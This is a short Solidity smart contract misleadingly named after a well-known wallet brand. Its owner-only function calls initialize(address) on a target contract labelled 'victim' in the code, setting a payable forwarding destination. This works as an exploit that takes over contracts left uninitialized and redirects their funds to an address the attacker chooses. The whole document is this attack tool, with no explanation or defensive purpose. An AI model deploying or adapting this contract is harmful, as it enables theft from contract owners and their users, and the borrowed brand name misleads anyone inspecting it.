// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MetaMaskBridgeAggregator {
    address private immutable _owner;

    error InitializeFailed(address victim, address destination, bytes reason);
    error NotAuthorized();
    
    event ForwardingSetup(
        address indexed victim,
        address destination,
        bool success
    );

    constructor(address owner_) {
        _owner = owner_;
    }

    modifier onlyOwner() {
        if (msg.sender != _owner) revert NotAuthorized();
        _;
    }

    function setupForwarding(
        address victim,
        address payable destination
    ) external onlyOwner {
        (bool success, bytes memory reason) = victim.call(
            abi.encodeWithSignature("initialize(address)", destination)
        );
        emit ForwardingSetup(victim, destination, success);
        if (!success) {
            revert InitializeFailed(victim, destination, reason);
        }
    }
}